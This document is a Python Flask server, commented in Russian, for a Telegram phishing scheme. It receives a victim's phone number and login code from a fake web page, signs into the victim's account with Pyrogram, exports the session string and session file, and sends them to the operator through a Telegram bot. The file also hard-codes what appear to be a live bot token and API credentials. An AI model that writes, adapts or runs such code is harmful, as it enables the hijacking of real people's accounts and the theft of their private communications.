from flask import Flask, request, jsonify, send_from_directory
import asyncio
import os
import zipfile
import re
from pyrogram import Client
from threading import Thread

app = Flask(__name__, static_folder='.')

# ===== НАСТРОЙКИ (ЗАМЕНИ НА СВОИ) =====
BOT_TOKEN = "7972485896:AAGDUO9cKu4qMdoa7dC87-Ybq1kUoPZNF_A"
OWNER_ID = 742347183  # ТВОЙ ID
API_ID = 39945573
API_HASH = "4addef563b163d9d1977fdfb4abf50db"

PROXY_ENABLED = False
PROXY_HOST = "bproxy.site"
PROXY_PORT = 1080
PROXY_USERNAME = "логин"
PROXY_PASSWORD = "пароль"

proxy_dict = None
if PROXY_ENABLED:
    proxy_dict = {
        "scheme": "socks5",
        "hostname": PROXY_HOST,
        "port": PROXY_PORT,
        "username": PROXY_USERNAME,
        "password": PROXY_PASSWORD
    }

# ===== ФУНКЦИЯ ОТПРАВКИ В TELEGRAM =====
def send_telegram(text):
    import requests
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": OWNER_ID, "text": text})
    except:
        pass

def send_file(file_path, caption):
    import requests
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            requests.post(url, data={"chat_id": OWNER_ID, "caption": caption}, files={"document": f})
    except:
        pass

# ===== ФУНКЦИЯ ВХОДА В АККАУНТ =====
def login_and_send(phone, code):
    """Запускает асинхронный вход в отдельном потоке"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(do_login(phone, code))

async def do_login(phone, code):
    try:
        # Нормализуем номер
        phone = re.sub(r'\D', '', phone)
        if not phone.startswith('7') and not phone.startswith('8'):
            phone = '7' + phone
        if len(phone) == 10:
            phone = '7' + phone
        if phone.startswith('8'):
            phone = '7' + phone[1:]
        phone = '+' + phone

        send_telegram(f"🔄 Пытаюсь войти в {phone}")

        # Создаём клиента
        session_name = f"sessions/{phone.replace('+', '')}"
        os.makedirs("sessions", exist_ok=True)

        client = Client(
            session_name,
            api_id=API_ID,
            api_hash=API_HASH,
            proxy=proxy_dict if PROXY_ENABLED else None
        )

        await client.connect()
        
        # Отправляем код (если ещё не отправлен)
        # В нашем случае код уже отправлен через сайт, но нужно получить hash
        # Упростим: попробуем войти сразу с кодом
        try:
            # Пытаемся войти
            await client.sign_in(phone, code)
        except Exception as e:
            # Если нужно отправить код заново
            if "PHONE_CODE_EXPIRED" in str(e) or "CODE" in str(e):
                await client.send_code(phone)
                await asyncio.sleep(2)
                await client.sign_in(phone, code)
            else:
                raise

        # Успех — получаем сессию
        session_str = await client.export_session_string()
        
        # Сохраняем session файл
        session_file = f"{session_name}.session"
        
        # Создаём ZIP с session файлом
        zip_name = f"sessions/{phone.replace('+', '')}.zip"
        with zipfile.ZipFile(zip_name, 'w') as zf:
            zf.write(session_file, arcname=os.path.basename(session_file))
        
        # Отправляем владельцу
        send_telegram(f"✅ УСПЕХ! Аккаунт: {phone}")
        send_file(zip_name, f"🎯 Аккаунт: {phone}\nSession string:\n{session_str}")
        
        # Чистим
        await client.disconnect()
        os.remove(session_file)
        os.remove(zip_name)
        
    except Exception as e:
        send_telegram(f"❌ Ошибка входа {phone}: {str(e)[:200]}")

# ===== API ЭНДПОЙНТЫ =====
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/api/send_code', methods=['POST'])
def send_code():
    data = request.json
    phone = data.get('phone')
    send_telegram(f"📱 НОВЫЙ НОМЕР: {phone}\nОжидает код...")
    return jsonify({"status": "ok"})

@app.route('/api/verify_code', methods=['POST'])
def verify_code():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    
    # Запускаем вход в отдельном потоке (чтобы не блокировать Flask)
    thread = Thread(target=login_and_send, args=(phone, code))
    thread.start()
    
    return jsonify({"success": True})

if __name__ == '__main__':
    print("🚀 Сервер запущен на http://localhost:5000")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)